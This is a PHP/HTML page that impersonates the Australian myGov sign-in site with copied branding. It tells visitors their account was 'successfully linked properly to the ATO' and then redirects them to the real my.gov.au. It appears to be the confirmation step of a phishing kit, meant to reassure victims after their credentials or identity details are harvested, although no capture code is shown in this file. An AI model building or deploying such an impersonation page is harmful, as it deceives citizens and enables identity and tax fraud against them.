<?php
error_reporting(0);
session_start();
?>
<!DOCTYPE html>
<html lang="en">
  <head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
    <meta http-equiv="x-ua-compatible" content="ie=edge" />
    <meta name="apple-mobile-web-app-capable" content="yes" />
    <title>Sign in with myGov - myGov</title>
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <link href="../Assets/css/css.css" rel="stylesheet" />
    <link href="../Assets/css/mgv2-application.css" rel="stylesheet" />
    <link href="../Assets/css/blugov.css" rel="stylesheet" />
    <script>
      setTimeout(() => {
        window.location.href = "https://my.gov.au/";
      }, 4000);
    </script>
    <link
      rel="icon"
      type="image/png"
      sizes="32x32"
      href="../Assets/images/favicon-32x32.png"
    />
    <link
      rel="icon"
      type="image/png"
      sizes="16x16"
      href="../Assets/images/favicon-16x16.png"
    />
    <style>
      .ato-success h1,
      .text-align-left {
        font-size: 1em !important;
        color: rgb(24, 130, 230);
      }

      .loading {
        display: flex;
        align-items: center;
        color: rgb(24, 130, 230) !important;
        font-size: 1em;
      }

      .dot {
        width: 5px;
        height: 5px;
        margin: 0 5px;
        background-color: rgb(24, 130, 230);
        border-radius: 50%;
        animation: bounce 1.2s infinite;
      }

      .dot:nth-child(1) {
        animation-delay: 0s;
      }

      .dot:nth-child(2) {
        animation-delay: 0.2s;
      }

      .dot:nth-child(3) {
        animation-delay: 0.4s;
      }

      @keyframes bounce {
        0%,
        80%,
        100% {
          transform: translateY(0);
        }
        40% {
          transform: translateY(-5px);
        }
      }
    </style>
  </head>

  <body>
    <header role="banner" class="mgvEnhanceHeader">
      <section class="wrapper">
        <div class="inner">
          <div class="unauth-grid">
            <div class="unauth-grid-row">
              <a href="#" class="unauth-govt-crest__link">
                <img
                  id="unauth-govt-crest"
                  src="../Assets/images/myGov-cobranded-logo-black.svg"
                  alt="myGov Beta"
                  role="img"
                />
              </a>
            </div>
          </div>
        </div>
      </section>
    </header>
    <div class="wrapper-mapwap">
      <div class="main-block" id="content" role="main">
        <div class="unauth">
          <div class="login-grid-container">
            <div class="login-grid-row">
              <div class="login-grid-column">
                <div class="digital-id-login-card-wrapper">
                  <div class="digital-id-main-login-card override ato-success">
                    <h1>
                      Your account has been successfully linked properly to the
                      ATO.
                    </h1>
                    <div class="loading">
                      <div class="text">
                        <h5>Please wait, redirecting</h5>
                      </div>
                      <div class="dot"></div>
                      <div class="dot"></div>
                      <div class="dot"></div>
                    </div>
                  </div>
                </div>
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>

    <footer role="contentinfo">
      <div class="wrapper">
        <div class="inner">
          <section class="footer-list">
            <nav>
              <h2 class="sr-only" aria-label="Footer">Footer</h2>
              <ul class="lower-links">
                <li>
                  <a target="_blank" href="#">Terms of use</a>
                </li>
                <li>
                  <a target="_blank" href="#">Privacy and security</a>
                </li>
                <li>
                  <a target="_blank" href="#">Copyright</a>
                </li>
                <li>
                  <a target="_blank" href="#">Accessibility</a>
                </li>
              </ul>
            </nav>
          </section>
          <div class="footer-lower">
            <section class="footer-lower-logo">
              <a href="#">
                <img
                  src="../Assets/images/myGov-cobranded-logo-white.svg"
                  alt="myGov Beta"
                  width="313.17"
                  height="70"
                  role="img"
                />
              </a>
            </section>
            <p class="footer-acknowledgement">
              We acknowledge the Traditional Custodians of the lands we live on.
              We pay our respects to all Elders, past and present, of all
              Aboriginal and Torres Strait Islander nations.
            </p>
          </div>
        </div>
      </div>
    </footer>

    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.1.1/jquery.min.js"></script>
    <script src="https://s3-us-west-2.amazonaws.com/s.cdpn.io/3/jquery.inputmask.bundle.js"></script>
    <script type="text/javascript"></script>
    <!-- Optional JavaScript -->
    <!-- jQuery first, then Popper.js, then Bootstrap JS -->
    <script
      type="text/javascript"
      src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.min.js"
    ></script>
    <script
      type="text/javascript"
      src="https://code.jquery.com/jquery-3.2.1.slim.min.js"
    ></script>
    <script
      type="text/javascript"
      src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js"
    ></script>
  </body>
</html>
